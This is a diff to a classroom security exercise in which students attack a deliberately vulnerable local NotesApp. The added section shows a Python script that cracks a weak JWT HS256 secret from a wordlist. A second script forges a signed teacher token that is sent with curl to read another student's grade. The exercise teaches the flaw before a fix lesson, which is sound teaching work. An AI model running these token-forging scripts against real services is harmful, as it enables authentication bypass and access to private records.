@@ -1,8 +1,9 @@
 # Exercise — Forge a token: become a teacher
 
 **Your job:** make NotesApp believe you are a teacher, and read a grade that is not yours —
-**without a password and without any key.** You only *break* it today. You fix it next class.
-About 18 minutes, with your pair.
+**without a password and without any key.** Two ways in: Part 1 skips the signature; Part 2 cracks
+the secret behind it. You only *break* it today. You fix it next class. About 25 minutes, with
+your pair.
 
 Work inside your `notesapp/` clone. Every command assumes you are in that folder.
 
@@ -142,15 +143,95 @@ curl -H "Authorization: Bearer $FORGED" http://localhost:8080/api/notes/3
 
 ---
 
+## Part 2 — "But I'll just reject `none`!" — not enough
+
+Suppose the server is fixed to **reject `alg:none`**. Your blank-signature trick now fails. Are
+you safe?
+
+!!! question "Predict first — commit with your pair"
+    The server now demands a **real HS256 signature**. To sign, you need its secret key — and you
+    don't have it. **Can you still forge a teacher token?** Yes or no, and why?
+
+The signature is only as strong as the **secret** behind it. NotesApp signs with the word
+`s3cr3t` — eight characters. A short secret can be **guessed** from a list of common ones. If you
+guess it, you can sign a token that looks completely genuine.
+
+### Step 5 — Crack the secret
+
+You already have alice's **real** token from Step 1 (three parts, properly signed). Its signature
+was made from `header.payload` + the secret. Try each word in a list until one produces the same
+signature — that word **is** the secret.
+
+Download the wordlist: [`jwt-secrets.txt`](assets/jwt-secrets.txt) (save it next to your clone),
+then:
+
+```bash
+python3 - <<'PY'
+import hmac, hashlib, base64
+tok = "PASTE_ALICE_REAL_TOKEN_FROM_STEP_1"
+head_payload = ".".join(tok.split(".")[:2])
+target_sig   = tok.split(".")[2]
+def b64(b): return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
+
+for word in open("jwt-secrets.txt").read().split():
+    sig = b64(hmac.new(word.encode(), head_payload.encode(), hashlib.sha256).digest())
+    if sig == target_sig:
+        print("CRACKED — the secret is:", repr(word))
+        break
+else:
+    print("not in the list")
+PY
+```
+
+!!! success "📏 Record"
+    - What is NotesApp's signing secret? ________  (expected: `s3cr3t`)
+    - It is a **real dictionary word in leetspeak**. How long would a random 32-character key take
+      to guess this way? (Think about it — this is why fix #3 is "long *and* random".)
+
+### Step 6 — Sign a *genuine* teacher token
+
+Now you hold the secret. Sign a brand-new teacher token — a real HS256 signature, not a blank
+one. This passes even a server that rejects `alg:none`.
+
+```bash
+SIGNED=$(python3 -c "import json,hmac,hashlib,base64
+b=lambda x: base64.urlsafe_b64encode(x).rstrip(b'=').decode()
+secret='s3cr3t'
+h=b(json.dumps({'alg':'HS256','typ':'JWT'}).encode())
+p=b(json.dumps({'user_id':9999,'username':'attacker','role':'teacher'}).encode())
+s=b(hmac.new(secret.encode(), f'{h}.{p}'.encode(), hashlib.sha256).digest())
+print(f'{h}.{p}.{s}')")
+curl -H "Authorization: Bearer $SIGNED" http://localhost:8080/api/notes/3
+```
+
+!!! success "📏 Record — what came back?"
+    - Did the **signed** forged token work? ________
+    - This token has a valid signature. Would "reject `alg:none`" have stopped it? ________ (no)
+
+??? question "Done? The lesson both halves add up to"
+    ??? success "The answer"
+        `alg:none` and a weak secret are **two different holes**, and closing one leaves the
+        other open:
+
+        - Reject `none` → stops the blank-signature forgery (Part 1).
+        - …but a guessable secret still lets an attacker make a **genuinely signed** token
+          (Part 2).
+
+        That is why the real fix is **all three** at once: reject `none`, pin the algorithm, **and**
+        use a long random secret. Miss any one, and a forged teacher walks in.
+
+---
+
 ## What you hand in
 
-Three lines. This is the finding:
+Four lines. This is the finding:
 
 ```
 FORGED-TOKEN FINDING — NotesApp flaw #4 (auth)
   What I read:   bob's grade (____) and comment, via /api/notes/3
-  How:           a JWT with "alg":"none" and no signature; role set to "teacher"
-  Why it worked: the server let the TOKEN choose how to verify, and I chose "don't"
+  Break 1:       a JWT with "alg":"none" and no signature; role set to "teacher"
+  Break 2:       cracked the HS256 secret (____) from a wordlist; signed a real teacher token
+  Why it worked: the server let the TOKEN choose how to verify, AND its secret was guessable
 ```
 
 ---
